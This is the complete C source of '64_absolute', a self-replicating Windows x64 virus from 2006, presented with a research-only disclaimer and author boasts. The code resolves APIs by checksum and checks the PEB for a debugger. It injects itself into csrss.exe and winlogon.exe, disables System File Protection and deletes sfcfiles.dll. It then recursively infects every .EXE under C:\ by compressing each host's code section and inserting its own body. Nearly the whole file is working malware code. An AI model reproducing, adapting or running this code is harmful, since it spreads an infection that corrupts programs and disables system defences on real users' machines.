//******************************************************************************
// THIS IS SOURCE CODE OF VIRUS. IT'S PURPOSE IS TO BE USED IN VIRUS RESEARCH
// ONLY. THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OF CODE AND INFORMATION
// PROVIDED HEREIN.
//
// 64_absolute by tanMa
// coded in Serbia, November 2006.
// demonyu@yahoo.com
//
//*[Words from SH]**************************************************************
//
// The main reason of this virus is show to the public that C/C++ can be 
// used in this contest and the code, when optimized is not even big.
// From the other side if MS built their OS with the same language, why 
// don't use it for a virus ? For the virus features see author notes.
//
// Your lovely SH.
//
//*[Words from author]**********************************************************
//
// First of all i want thx to SlageHammer for helping me about this virus.
//
// - Very first virus fully coded in C for Win64 (x64)
// - PE32+ memory resident mid-infector (not appender nor prepender ;-) )
// - First usage of PEB under Win64 !
// - Using un-documented apis for compression ! (never used in malwares)
// - Host size not alerted
// - Section headers remain un-touched
// - Anti-Heuristic 'coz of unique method of infection
// - Anti-Debug using PEB & injecting into CSRSS.EXE
// - SFC Disabling (yeah Ratter/29A method still rox)
// - Recursively scans to infect GUI&Console applications (from CSRSS.EXE)
// - crc insted of api names
// - size is 3696bytes (not bad for this kind of virus, can be more optimized
//   but i didn't want to loss C codin' style)
// - not avoid re-infecting, because host size doesn't grow anyway, and it
//   is little bit harder to clean ;-)
//
//******************************************************************************
#include "64_absolute.h"

VX_HEADER Virus_Header = {1, 1, 1};
char cCopyrightMsg[] = "64_absolute by tM & SH,a nice gift for all the AV community , Marry X.mas to all the AV";

HMODULE hKernelInstance= (HMODULE)0x1; //just make it initialized!
KERNEL_APIS Kernel;

DWORD KernelCSUMs[NumOfKernelApis] = { 
 Sleep_CSUM,
 LoadLibraryA_CSUM,
 GetModuleHandleA_CSUM,
 GetCurrentProcess_CSUM,
 OpenProcess_CSUM,
 CloseHandle_CSUM,
 VirtualAlloc_CSUM,
 VirtualFree_CSUM,
 VirtualAllocEx_CSUM,
 VirtualProtect_CSUM,
 WriteProcessMemory_CSUM,
 CreateRemoteThread_CSUM,
 CreateFileA_CSUM,
 CreateFileMappingA_CSUM,
 MapViewOfFile_CSUM,
 UnmapViewOfFile_CSUM,
 GetFileSize_CSUM,
 FindFirstFileA_CSUM,
 FindNextFileA_CSUM,
 FindClose_CSUM,
 OpenMutexA_CSUM,
 CreateMutexA_CSUM,
 ReleaseMutex_CSUM,
 GetLastError_CSUM, //forwarded from kernel32.dll (setup manualy)
 GetProcAddress_CSUM,
 GetCurrentThread_CSUM,
 SetThreadPriority_CSUM,
 GetSystemDirectoryA_CSUM,
 DeleteFileA_CSUM,
 ExitProcess_CSUM
};

NTDLL_APIS NtDll;
DWORD NtDllCSUMs[NumOfNtDllApis] = { RtlGetCompressionWorkSpaceSize_CSUM, RtlCompressBuffer_CSUM, RtlDecompressBuffer_CSUM };

USER_APIS User;
DWORD UserCSUMs[NumOfUserApis] = { MessageBoxA_CSUM, wsprintfA_CSUM };

PS_APIS PSapi;
DWORD PsapiCSUMs[NumOfPSApis] = { EnumProcesses_CSUM, EnumProcessModules_CSUM, GetModuleBaseNameA_CSUM };

ADV_APIS ADVapi;
DWORD ADVapiCSUMs[NumOfADVApis] = { OpenProcessToken_CSUM, LookupPrivilegeValueA_CSUM, AdjustTokenPrivileges_CSUM };

PIMAGE_DOS_HEADER lpVictimDosHeader;
PIMAGE_NT_HEADERS lpVictimPeHeader;

PIMAGE_SECTION_HEADER lpVictimCodeSectionHdr;

HANDLE hVictim;
HANDLE hMapVictim;
LPVOID lpBaseOfVictim;
DWORD dwVictimFileSize;

COMPRESSED_DATA *lpCompressedData;

/****************************************/
size_t mstrlen(const char *lpStr)
{
size_t len;
	for (len = 0; *lpStr != '\0'; lpStr++)
		len++;
return len;
}

/*****************************************
 *
 *
 */
DWORD StrCheckSum(LPCSTR lpStr)
{
DWORD sum = 0;
ULONGLONG i,pos = 0;
ULONGLONG len = mstrlen(lpStr);

	for (i = 0; i < len / 2; i++)
	{
		sum += MAKEWORD(lpStr[pos], lpStr[pos+1]);
		pos += 2;
	}
	
	if (1 == (len % 2))
		sum += MAKEWORD(lpStr[pos], 0);

return (sum + len);
}

/*****************************************
 *
 *
 */
HMODULE GetKernelBase(void)
{
PMYPEB pMYPEB;
PPEB_LDR_DATA pPEBLdrData;
PLDR_MODULE pLdrModule;

	pMYPEB = (MYPEB*)__readgsqword(0x60);

	pPEBLdrData = pMYPEB->LoaderData;

	pLdrModule = (PLDR_MODULE) pPEBLdrData->InLoadOrderModuleList.Flink; //current executable
	pLdrModule = (PLDR_MODULE) pLdrModule->InLoadOrderModuleList.Flink;  //ntdll.dll
	pLdrModule = (PLDR_MODULE) pLdrModule->InLoadOrderModuleList.Flink;  //kernel32.dll

return (HMODULE)pLdrModule->BaseAddress;
}

/*****************************************
 * Insted of Windows GetProcAddress
 * This doesn't work for forwarded externals
 */
FARPROC GetProcAddressCSUM(HMODULE lpDllBase, DWORD dwCSUM)
{
PIMAGE_DOS_HEADER lpDllMZ;
PIMAGE_NT_HEADERS lpDllPE;
PIMAGE_EXPORT_DIRECTORY lpDllExp;

LPDWORD lpAddressOfNames;
 LPWORD lpAddressOfNameOrdinals;
LPDWORD lpAddressOfFunctions;

ULONGLONG index;

	if (NULL != lpDllBase)
	{
		lpDllMZ  = (PIMAGE_DOS_HEADER)lpDllBase;
		lpDllPE  = (PIMAGE_NT_HEADERS)( (ULONGLONG)lpDllMZ + lpDllMZ->e_lfanew );
		lpDllExp = (PIMAGE_EXPORT_DIRECTORY)( (ULONGLONG)lpDllMZ + lpDllPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

		lpAddressOfNames        = (LPDWORD)( (ULONGLONG)lpDllMZ + lpDllExp->AddressOfNames );
		lpAddressOfNameOrdinals =  (LPWORD)( (ULONGLONG)lpDllMZ + lpDllExp->AddressOfNameOrdinals );
		lpAddressOfFunctions    = (LPDWORD)( (ULONGLONG)lpDllMZ + lpDllExp->AddressOfFunctions );

		for (index=0; index < lpDllExp->NumberOfNames; index++)
		{
		LPCSTR lpName = (LPCSTR)( (ULONGLONG)lpDllMZ + lpAddressOfNames[index] );
			if( StrCheckSum( lpName ) == dwCSUM )
				return (FARPROC)( (ULONGLONG)lpDllMZ + lpAddressOfFunctions[lpAddressOfNameOrdinals[index]] );
		}
	}

return NULL;
}

/*****************************************
 *
 *
 */
BOOL IsDebuggerActive(void)
{
	return (BOOL)((MYPEB*)__readgsqword(0x60))->bBeingDebugged;
}

/*****************************************
 * "Old" array&loop technique
 *
 */
BOOL RetriveApisFromArray ( HMODULE hModule, DWORD ApiNamesCSUM[], ULONGLONG Addresses[], int numofapis )
{
ULONGLONG i;
	for (i = 0 ; i < numofapis; i++)
	{
		Addresses[i] = (ULONGLONG)GetProcAddressCSUM( hModule, ApiNamesCSUM[i] );
		if( 0 == Addresses[i] )
			return FALSE;
	}

return TRUE;
}

/*****************************************
 *
 *
 */
BOOL RetriveApis(void)
{
	if( !RetriveApisFromArray( hKernelInstance, KernelCSUMs, (PULONGLONG)&Kernel, NumOfKernelApis) )
		return FALSE;

	 //setup manualy
	 if( NULL == (Kernel.aGetLastError = (tGetLastError*)Kernel.aGetProcAddress( hKernelInstance,"GetLastError")) )
		 return FALSE;

	if( !RetriveApisFromArray( Kernel.aGetModuleHandleA("ntdll"), NtDllCSUMs, (PULONGLONG)&NtDll, NumOfNtDllApis) )
		return FALSE;

	if( !RetriveApisFromArray( Kernel.aLoadLibraryA("user32"), UserCSUMs, (PULONGLONG)&User, NumOfUserApis) )
		return FALSE;

	if( !RetriveApisFromArray( Kernel.aLoadLibraryA("psapi"), PsapiCSUMs, (PULONGLONG)&PSapi, NumOfPSApis) )
		return FALSE;

	if( !RetriveApisFromArray( Kernel.aLoadLibraryA("advapi32"), ADVapiCSUMs, (PULONGLONG)&ADVapi, NumOfADVApis) )
		return FALSE;

return TRUE;
}

/*****************************************
 *
 *
 */
BOOL AdjustPrivileges(void)
{
HANDLE hToken;
BOOL ret = FALSE;

	if (ADVapi.aOpenProcessToken(Kernel.aGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
	LUID luid;
		if (ADVapi.aLookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid))
		{
		TOKEN_PRIVILEGES tk_priv;

			tk_priv.PrivilegeCount = 1;
			tk_priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			tk_priv.Privileges[0].Luid = luid;

			if (ADVapi.aAdjustTokenPrivileges(hToken,
				FALSE,
				&tk_priv,
				0,
				NULL,
				NULL)) ret = TRUE;
		}
	Kernel.aCloseHandle(hToken);
  	}

return ret;
}

/*****************************************
 *
 *
 */
COMPRESSED_DATA *CompressData(PUCHAR lpInBuffer, DWORD nLen)
{
LPVOID lpWorkSpace;		//interal buffer
ULONG BufferWorkSpaceSize;	//size of interal buffer
ULONG FragmentWorkSpaceSize;
ULONG FinalCompressedSize;	//size after compression
PUCHAR lpOutBuffer;
COMPRESSED_DATA *lpCD;

	//initialize work space buffer
	if (!NT_SUCCESS(NtDll.aRtlGetCompressionWorkSpaceSize(COMPRESS_FORMAT_ENGINE, &BufferWorkSpaceSize, &FragmentWorkSpaceSize)))
		return NULL;

	//allocate work space buffer
	if (NULL == (lpWorkSpace = Kernel.MEMALLOC(BufferWorkSpaceSize)))
		return NULL;

	//allocate output buffer
	if (NULL == (lpOutBuffer = (PUCHAR)Kernel.MEMALLOC(nLen)))
	{
		Kernel.MEMFREE(lpWorkSpace);
		return NULL;
	}

	//compress
	if (!NT_SUCCESS(NtDll.aRtlCompressBuffer(COMPRESS_FORMAT_ENGINE, lpInBuffer, nLen, lpOutBuffer, nLen, 0x1000, &FinalCompressedSize, lpWorkSpace )))
	{
		Kernel.MEMFREE(lpWorkSpace);
		Kernel.MEMFREE(lpOutBuffer);
		return NULL;
	}

	if (NULL == (lpCD = (COMPRESSED_DATA *)Kernel.MEMALLOC(sizeof(COMPRESSED_DATA))))
	{
		Kernel.MEMFREE(lpWorkSpace);
		Kernel.MEMFREE(lpOutBuffer);
		return NULL;
	}

	Kernel.MEMFREE(lpWorkSpace);

	lpCD->lpCompressedBuffer = lpOutBuffer;
	lpCD->dwUncompressedLen = nLen;
	lpCD->dwCompressedLen = FinalCompressedSize;

return lpCD;
}

/*****************************************
 *
 *
 */
void FreeCompressedData(COMPRESSED_DATA *lpCD)
{
	if (NULL != lpCD)
	{
		Kernel.MEMFREE(lpCD->lpCompressedBuffer);
		Kernel.MEMFREE(lpCD);
		lpCD = NULL;
	}

return;
}

/*****************************************
 *
 *
 */
BOOL OpenAndMap(LPCSTR lpFileName)
{
	hVictim = Kernel.aCreateFileA(lpFileName, 
			GENERIC_READ | GENERIC_WRITE, 
			FILE_SHARE_READ, NULL, 
			OPEN_EXISTING, 
			0, 
			NULL);

	if( INVALID_HANDLE_VALUE == hVictim )
		return FALSE;

	dwVictimFileSize = Kernel.aGetFileSize(hVictim, NULL);

	hMapVictim = Kernel.aCreateFileMappingA(hVictim, 
			NULL, 
			PAGE_READWRITE, 
			0, 
			dwVictimFileSize, 
			NULL);

	if (NULL == hMapVictim || INVALID_HANDLE_VALUE == hMapVictim)
	{
		Kernel.aCloseHandle(hVictim);
		return FALSE;
	}

	lpBaseOfVictim = Kernel.aMapViewOfFile(hMapVictim, 
			FILE_MAP_ALL_ACCESS, 
			0,
			0, 
			dwVictimFileSize);

	if( NULL == lpBaseOfVictim )
	{
		Kernel.aCloseHandle(hMapVictim);
		Kernel.aCloseHandle(hVictim);
		return FALSE;
	}

return TRUE;
}

/*****************************************
 *
 *
 */
void CloseAndUnMap(void)
{
	Kernel.aUnmapViewOfFile(lpBaseOfVictim);
	Kernel.aCloseHandle(hMapVictim);
	Kernel.aCloseHandle(hVictim);
}

/*****************************************
 *
 *
 */
BOOL PrepareAndCheck(void)
{
	lpVictimDosHeader = (PIMAGE_DOS_HEADER)lpBaseOfVictim;
	lpVictimPeHeader  = (PIMAGE_NT_HEADERS)((ULONGLONG)lpVictimDosHeader + lpVictimDosHeader->e_lfanew);

	lpVictimCodeSectionHdr = IMAGE_FIRST_SECTION(lpVictimPeHeader);
	if (!(IMAGE_SCN_CNT_CODE & lpVictimCodeSectionHdr->Characteristics))
		return FALSE;

	if (0x20B != lpVictimPeHeader->OptionalHeader.Magic || IMAGE_FILE_MACHINE_AMD64 != lpVictimPeHeader->FileHeader.Machine)
		return FALSE;

	if (!(IMAGE_SUBSYSTEM_WINDOWS_CUI == lpVictimPeHeader->OptionalHeader.Subsystem || IMAGE_SUBSYSTEM_WINDOWS_GUI == lpVictimPeHeader->OptionalHeader.Subsystem))
		return FALSE;

	if (IMAGE_FILE_DLL & lpVictimPeHeader->FileHeader.Characteristics || IMAGE_FILE_SYSTEM & lpVictimPeHeader->FileHeader.Characteristics)
		return FALSE;

	lpCompressedData = CompressData((PUCHAR)((ULONGLONG)lpBaseOfVictim + lpVictimCodeSectionHdr->PointerToRawData), lpVictimCodeSectionHdr->SizeOfRawData);

	if (NULL == lpCompressedData)
		return FALSE;

	//is there space?
	if (lpCompressedData->dwCompressedLen + Virus_Size >= lpVictimCodeSectionHdr->SizeOfRawData)
	{
		FreeCompressedData(lpCompressedData);
		return FALSE;
	}

return TRUE;
}

/*****************************************
 * What this function does?
 *
 */
void InfectPE(LPCSTR lpFileName)
{
	if (OpenAndMap(lpFileName))
	{
		if (PrepareAndCheck())
		{
			Virus_Header.dwCompressedSectionLen  = lpCompressedData->dwCompressedLen;
			Virus_Header.dwUnCompressedSectionLen = lpCompressedData->dwUncompressedLen;
			Virus_Header.dwHostEntryRVA = lpVictimPeHeader->OptionalHeader.AddressOfEntryPoint;

			//copy compressed data
			__movsb((PUCHAR)((ULONGLONG)lpBaseOfVictim + lpVictimCodeSectionHdr->PointerToRawData), lpCompressedData->lpCompressedBuffer,lpCompressedData->dwCompressedLen);	

			//copy virus
			__movsb((PUCHAR)((ULONGLONG)lpBaseOfVictim + lpVictimCodeSectionHdr->PointerToRawData + lpCompressedData->dwCompressedLen), (PUCHAR)Virus_VA, Virus_Size);

			//set entry point
			lpVictimPeHeader->OptionalHeader.AddressOfEntryPoint  = lpVictimCodeSectionHdr->VirtualAddress + lpCompressedData->dwCompressedLen;
			lpVictimPeHeader->OptionalHeader.AddressOfEntryPoint += (ULONGLONG)&PreGeneration2 - Virus_VA;

			FreeCompressedData(lpCompressedData);
		}
	CloseAndUnMap();
	}
return;
}

/*****************************************
 *
 *
 */
HANDLE OpenProcessVX(DWORD dwMainModuleNameCSUM)
{
ULONGLONG bytesneeded;
DWORD ProcessIdList[512];
ULONGLONG ProcessesNum;
ULONGLONG i;

	//enumerate processes (get theirs ID)
	PSapi.aEnumProcesses(ProcessIdList, sizeof(ProcessIdList), &(DWORD)bytesneeded);
	ProcessesNum = bytesneeded / sizeof(DWORD);

	//walk thorough array of ProcessIdList
	for (i = 0; i < ProcessesNum; i++)
	{
		HANDLE hOP = Kernel.aOpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessIdList[i]);

		if (NULL != hOP)
		{
			HMODULE hMod;
			char cModuleName[MAX_PATH];

			PSapi.aEnumProcessModules(hOP, &hMod, sizeof(hMod), &(DWORD)bytesneeded);
			PSapi.aGetModuleBaseNameA(hOP, hMod, cModuleName, MAX_PATH);

			//is it what we looking for?
			if (StrCheckSum(cModuleName) == dwMainModuleNameCSUM)
				return hOP;
		}
		Kernel.aCloseHandle(hOP);
	}

return NULL;
}

/*****************************************
 * Injects virus into remote preocess
 *
 */
HANDLE InsertVirusInToRemoteProcess(DWORD dwProcessMainModuleNameCSUM, ULONGLONG EntryPoint)
{
HANDLE hTargetProcess,hRemoteThread;
LPVOID lpVirusAddrInTargetProcess;

	hTargetProcess = OpenProcessVX(dwProcessMainModuleNameCSUM);
	if (NULL == hTargetProcess)
		return NULL;

	//Allocate memory in target process for virus
	lpVirusAddrInTargetProcess = Kernel.aVirtualAllocEx(hTargetProcess, 
					NULL,
					Virus_Size + Virus_Extra_Space,
					MEM_RESERVE | MEM_COMMIT,
					PAGE_EXECUTE_READWRITE);

	if (NULL == lpVirusAddrInTargetProcess)
	{
		Kernel.aCloseHandle(hTargetProcess);
		return NULL;
	}

	//dump virus body into target process
	if( !Kernel.aWriteProcessMemory(hTargetProcess, lpVirusAddrInTargetProcess, (LPCVOID)Virus_VA, Virus_Size,NULL))
	{
		Kernel.aCloseHandle(hTargetProcess);
		return NULL;
	}

	//Execute virus as remote thread
	hRemoteThread = Kernel.aCreateRemoteThread(hTargetProcess,
				0,
				0,
				(LPTHREAD_START_ROUTINE)((ULONGLONG)lpVirusAddrInTargetProcess + EntryPoint - Virus_VA),
				0,
				0,
				0);

	if (NULL == hRemoteThread)
	{
		Kernel.aCloseHandle(hTargetProcess);
		return NULL;
	}

	Kernel.aCloseHandle(hTargetProcess);

return hRemoteThread;
}

/*****************************************
 * Infect all .EXE files in given directory
 * 
 */
void InfectFiles(LPCSTR lpPath)
{
HANDLE hFindFile;
WIN32_FIND_DATA FindFileData;
char cPathMask[MAX_PATH];
char cFilePath[MAX_PATH];
WCHAR wszFileName[MAX_PATH];

	User.awsprintfA( cPathMask, "%s%s", lpPath, "*.EXE");

	hFindFile = Kernel.aFindFirstFileA( cPathMask , &FindFileData );
	if( INVALID_HANDLE_VALUE != hFindFile )
	{
		do
		{
			User.awsprintfA( cFilePath, "%s%s", lpPath, FindFileData.cFileName );
			InfectPE(cFilePath);
		}
		while( Kernel.aFindNextFileA( hFindFile, &FindFileData ) );
		Kernel.aFindClose(hFindFile);
	}
}

/*****************************************
 * Recursively scan sub-directories and call InfectFiles
 * for each directory it finds
 */
void InfectDirsAndSubDirs(LPCSTR lpPath)
{
HANDLE hFindFile;
WIN32_FIND_DATA FindFileData;
char cPath[MAX_PATH],cPathMask[MAX_PATH];

	User.awsprintfA(cPathMask, "%s%s", lpPath, "*");

	//infect all in "this" directory
	InfectFiles(lpPath);

	hFindFile = Kernel.aFindFirstFileA(cPathMask , &FindFileData);
	if (INVALID_HANDLE_VALUE != hFindFile)
	{
		do
		{
			//ignore if it starts with "." or ".." and include directories
			if ('.' != FindFileData.cFileName[0] && (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{

				User.awsprintfA( cPath, "%s%s%s", lpPath, FindFileData.cFileName, "\\");
				InfectDirsAndSubDirs(cPath);
				__movsb(cPath, lpPath, mstrlen(lpPath) );
			}
		}
		while (Kernel.aFindNextFileA(hFindFile, &FindFileData));
		Kernel.aFindClose(hFindFile);       
	}

}

/*****************************************
 * Virus entry point in remote process (winlogon.exe)
 * Control is passed here by "Injector"
 */
void IntruderWINLOGON(void)
{
HMODULE hSFCInstance;
FARPROC aSfcGoodBye;
char sSystemDirPath[MAX_PATH];
char sPathToFile[MAX_PATH];

	if( !RetriveApis() )
		return;

	hSFCInstance = Kernel.aLoadLibraryA("sfc");

	//Find by ordinal (un-documented by Microsoft, documented by Ratter/29A)
	if (NULL == (aSfcGoodBye = Kernel.aGetProcAddress(hSFCInstance, (char *) 2)))
		return;

	//disable SFP - runtime
	aSfcGoodBye();

	//composite path&name to sfcfiles.dll
	Kernel.aGetSystemDirectoryA(sSystemDirPath,MAX_PATH);
	User.awsprintfA(sPathToFile,"%s%s",sSystemDirPath,"\\sfcfiles.dll");

	//SFC GoodBye for ever...
	Kernel.aDeleteFileA(sPathToFile);
}

/*****************************************
 * Virus entry point in remote process (crss.exe)
 * Control is passed here by "Injector"
 */
void IntruderCSRSS(void)
{
HANDLE hMutex;

	//!we do not have to search kernel base address again,
	//because we already found it (by "Injector")
	//just find api addresses
	if( !RetriveApis() )
		return;

	//don't slow down the system...
	Kernel.aSetThreadPriority( Kernel.aGetCurrentThread(), THREAD_PRIORITY_IDLE);

	//disable SFC
	//we dont have to call AdjustPrivileges(), because csrss.exe have needed privileges
	InsertVirusInToRemoteProcess(winlogon_exe_CSUM, (ULONGLONG)&IntruderWINLOGON);
	Kernel.aSleep(2000);

	hMutex = Kernel.aCreateMutexA( NULL, FALSE, cCopyrightMsg);

	InfectDirsAndSubDirs("c:\\");
	//till next restart ZzZzZz....
	Kernel.aSleep(INFINITE);
	Kernel.aCloseHandle(hMutex);
}

/*****************************************
 *
 *
 */
void Generation2(void)
{
PIMAGE_DOS_HEADER lpCurrentDosHeader;
PIMAGE_NT_HEADERS lpCurrentPeHeader;
PIMAGE_SECTION_HEADER lpCurrentCodeSectionHdr;

LPVOID lpTempBuffer;
FARPROC lpHostEntry;
HANDLE hMutex;
DWORD oldProtect,d;

	if (IsDebuggerActive())
		return;

	if (!RetriveApis())
		return;

	lpCurrentDosHeader = (PIMAGE_DOS_HEADER)Kernel.aGetModuleHandleA(NULL);
	lpCurrentPeHeader  = (PIMAGE_NT_HEADERS)((ULONGLONG)lpCurrentDosHeader + lpCurrentDosHeader->e_lfanew);
	lpCurrentCodeSectionHdr  = IMAGE_FIRST_SECTION(lpCurrentPeHeader);

	//copy compressed section into temp buffer
	lpTempBuffer = Kernel.MEMALLOC(Virus_Header.dwCompressedSectionLen);
	__movsb((PUCHAR)lpTempBuffer, (PUCHAR)((ULONGLONG)lpCurrentDosHeader + lpCurrentCodeSectionHdr->VirtualAddress), Virus_Header.dwCompressedSectionLen);

	//unprotect host .code section for writing (in memory)
	if (!Kernel.aVirtualProtect((LPVOID)(((ULONGLONG)lpCurrentDosHeader + lpCurrentCodeSectionHdr->VirtualAddress)), lpCurrentCodeSectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect))
		return;

	//restore host .code section (in memory)
	if (!NT_SUCCESS(NtDll.aRtlDecompressBuffer(COMPRESS_FORMAT_ENGINE, (PUCHAR)((ULONGLONG)lpCurrentDosHeader + lpCurrentCodeSectionHdr->VirtualAddress), Virus_Header.dwUnCompressedSectionLen, lpTempBuffer, Virus_Header.dwCompressedSectionLen, &d)))
		return;

	 //User.aMessageBoxA(NULL, cCopyrightMsg,"Generation 2", MB_OK | MB_ICONEXCLAMATION);

	//if virii is not "resident" then inject into csrss.exe
	hMutex = Kernel.aOpenMutexA( 0, FALSE, cCopyrightMsg);
	if (NULL == hMutex && ERROR_FILE_NOT_FOUND == Kernel.aGetLastError())
	{
		AdjustPrivileges();
		InsertVirusInToRemoteProcess( csrss_exe_CSUM, (ULONGLONG)&IntruderCSRSS);
	}

	//execute host
        lpHostEntry = (FARPROC)((ULONGLONG)lpCurrentDosHeader + Virus_Header.dwHostEntryRVA);
	lpHostEntry();

	//we should not back here if, exit
	Kernel.aExitProcess(0);
}

/*****************************************
 * This function is entry point for infected host
 * Remember: vars on stack, because we r in host .code 
 * section and we r not granted to write in virii global data
 */
void PreGeneration2(void)
{
KERNEL_APIS LocalKernel;
USER_APIS LocalUser;
LPVOID lpNewVirAddr;
FARPROC lpGoTo;
DWORD oldProtect;

	if (!RetriveApisFromArray(GetKernelBase(), KernelCSUMs, (PULONGLONG)&LocalKernel, NumOfKernelApis))
		return;

	//alocate memory and move virus to new address
	lpNewVirAddr = LocalKernel.MEMALLOC(Virus_Size + Virus_Extra_Space);
	__movsb((PUCHAR)lpNewVirAddr, (PUCHAR)Virus_VA, Virus_Size);

	//make just alocated buffer executable
	if (!LocalKernel.aVirtualProtect(lpNewVirAddr, Virus_Size, PAGE_EXECUTE_READWRITE, &oldProtect))
		LocalKernel.aExitProcess(0);

	//pass control
	lpGoTo = (FARPROC)((ULONGLONG)lpNewVirAddr + (ULONGLONG)&Generation2 - Virus_VA);
	lpGoTo();

	//we should not get here
}